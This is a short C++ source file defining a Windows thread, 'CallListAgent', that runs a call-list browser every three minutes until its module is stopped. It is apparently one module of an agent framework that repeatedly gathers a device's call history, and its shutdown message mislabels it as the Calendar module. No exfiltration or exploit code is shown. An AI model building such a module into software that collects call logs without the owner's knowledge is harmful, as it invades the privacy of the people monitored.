#include "Modules.h"
#include "Common.h"
#include "Module.h"
#include "CallListBrowser.h"

DWORD WINAPI CallListAgent(LPVOID lpParam) {
	CallListBrowser *call = new(std::nothrow) CallListBrowser();
	Module *me = (Module *)lpParam;
	HANDLE eventHandle;

	me->setStatus(MODULE_RUNNING);
	eventHandle = me->getEvent();

	DBG_TRACE(L"Debug - CallList.cpp - CallList Module started\n", 5, FALSE);

	LOOP {
		call->Run(MODULE_CALLLIST);

		WaitForSingleObject(eventHandle, 3 * 60 * 1000);

		if (me->shouldStop()) {
			DBG_TRACE(L"Debug - Calendar.cpp - Calendar Module is Closing\n", 1, FALSE);
			delete call;

			me->setStatus(MODULE_STOPPED);
			return 0;
		}
	}

	return 0;
}